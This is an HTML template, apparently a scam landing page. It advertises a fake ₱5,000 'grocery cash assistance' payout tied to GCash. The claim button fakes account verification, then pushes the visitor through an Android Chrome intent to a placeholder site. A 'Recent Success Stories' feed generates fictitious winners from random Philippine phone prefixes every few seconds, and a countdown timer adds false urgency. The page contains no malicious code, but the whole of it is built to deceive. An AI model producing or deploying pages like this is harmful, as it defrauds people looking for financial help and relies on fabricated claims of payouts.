<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FreeShoppingPH | Official Payout</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --nature-green: #2d6a4f;
            --soft-mint: #d8f3dc;
            --emerald: #40916c;
            --white-glass: rgba(255, 255, 255, 0.9);
            --text-dark: #1b4332;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body { 
            font-family: 'Public Sans', sans-serif; 
            /* Peaceful Nature Gradient */
            background: linear-gradient(135deg, #e9f5f0 0%, #d8f3dc 100%); 
            color: var(--text-dark); 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: var(--white-glass);
            width: 100%;
            max-width: 400px;
            padding: 35px 25px;
            border-radius: 35px;
            /* Soft shadow for a "floating" look */
            box-shadow: 0 25px 50px rgba(45, 106, 79, 0.1);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.5);
            backdrop-filter: blur(10px);
        }

        .logo-img {
            width: 100%;
            max-width: 220px;
            margin: 0 auto 20px auto;
            display: block;
            border-radius: 20px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
        }

        h1 {
            font-size: 13px;
            color: var(--emerald);
            text-transform: uppercase;
            letter-spacing: 2.5px;
            font-weight: 800;
            margin-bottom: 8px;
        }

        .amount {
            font-family: 'Quicksand', sans-serif;
            font-size: 48px;
            font-weight: 700;
            color: var(--nature-green); 
            margin-bottom: 25px;
            /* Soft glow instead of sharp green */
            text-shadow: 0 4px 10px rgba(45, 106, 79, 0.15);
        }

        .pay-button { 
            background: linear-gradient(135deg, #52b788 0%, #2d6a4f 100%); 
            color: white; 
            width: 100%;
            padding: 20px; 
            border: none; 
            border-radius: 20px; 
            font-size: 16px; 
            font-weight: 700;
            letter-spacing: 1px;
            cursor: pointer; 
            transition: all 0.3s ease;
            box-shadow: 0 10px 25px rgba(45, 106, 79, 0.25);
        }

        .pay-button:active { transform: scale(0.96); }

        #timer-text { display: none; color: #d90429; font-weight: 700; margin-top: 15px; font-size: 14px; }

        .promo-photo {
            width: 100%;
            border-radius: 20px;
            margin-top: 25px;
            border: 4px solid white;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }

        .winners-container {
            background: rgba(255, 255, 255, 0.6);
            border: 1px solid var(--soft-mint);
            padding: 18px;
            border-radius: 25px;
            margin-top: 25px;
        }

        .winners-container h3 {
            font-size: 11px;
            color: var(--emerald);
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .winner-item {
            background: white;
            padding: 10px 15px;
            border-radius: 12px;
            font-size: 13px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            border: 1px solid #f0f7f4;
            animation: slideIn 0.6s ease forwards;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .payout-green { color: var(--emerald) !important; font-weight: 800; }

        .gcash-mini {
            width: 20px;
            height: 20px;
            border-radius: 5px;
        }
    </style>
</head>
<body>

<div class="card">
    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" alt="Logo" class="logo-img">
    
    <h1>AVAILABLE BALANCE</h1>
    <div class="amount" id="balanceText">₱5,000.00</div>

    <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">
        REDEEM GROCERY CASH ASSISTANCE
    </button>

    <div id="timer-text">SECURE RE-CLAIM IN: <span id="waitTimer">05:00</span></div>

    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo" alt="Assistance">

    <div class="winners-container">
        <h3>Recent Success Stories</h3>
        <div id="winners-list"></div>
    </div>
</div>

<script>
    function animateValue(id, start, end, duration) {
        const obj = document.getElementById(id);
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            const currentVal = Math.floor(progress * (end - start) + start);
            obj.innerHTML = "₱" + currentVal.toLocaleString() + ".00";
            if (progress < 1) {
                window.requestAnimationFrame(step);
            }
        };
        window.requestAnimationFrame(step);
    }

    function redirectToGCash() {
        const btn = document.getElementById('claimBtn');
        const bal = document.getElementById('balanceText');
        const timerDiv = document.getElementById('timer-text');

        animateValue("balanceText", 5000, 0, 1000); 
        bal.style.opacity = "0.6";

        btn.disabled = true;
        btn.innerHTML = "Verifying Account...";
        timerDiv.style.display = "block";

        startTimer(300);

        setTimeout(() => {
            // Updated Intent for Chrome
            window.location.href = "intent://yourwebsite.com#Intent;scheme=https;package=com.android.chrome;end"; 
        }, 1200);
    }

    function startTimer(sec) {
        let timer = sec;
        const display = document.getElementById('waitTimer');
        const interval = setInterval(() => {
            let m = Math.floor(timer / 60);
            let s = timer % 60;
            display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
            
            if (--timer < 0) {
                clearInterval(interval);
                animateValue("balanceText", 0, 5000, 1500); 
                const bal = document.getElementById('balanceText');
                const btn = document.getElementById('claimBtn');
                bal.style.opacity = "1";
                btn.disabled = false;
                btn.innerHTML = "CLAIM MY ASSISTANCE";
                document.getElementById('timer-text').style.display = "none";
            }
        }, 1000);
    }

    function generateWinner() {
        const prefixes = ['0917', '0922', '0998', '0905', '0916', '0945', '0966'];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const lastThree = Math.floor(100 + Math.random() * 900);
        
        // Assuming your icon is in images/gc_icon.png
        const myGcashImage = "images/gc_icon.png"; 

        const winnerEntry = document.createElement('div');
        winnerEntry.className = 'winner-item';
        winnerEntry.innerHTML = `
            <span>📱 ${randomPrefix}***${lastThree}</span>
            <strong class="payout-green">+₱5,000</strong>
        `;

        const list = document.getElementById('winners-list');
        if (list) {
            list.prepend(winnerEntry);
            if (list.children.length > 4) {
                list.removeChild(list.lastChild);
            }
        }
    }

    // Start the live feed
    generateWinner();
    setInterval(generateWinner, 4000);
</script>

</body>
</html>
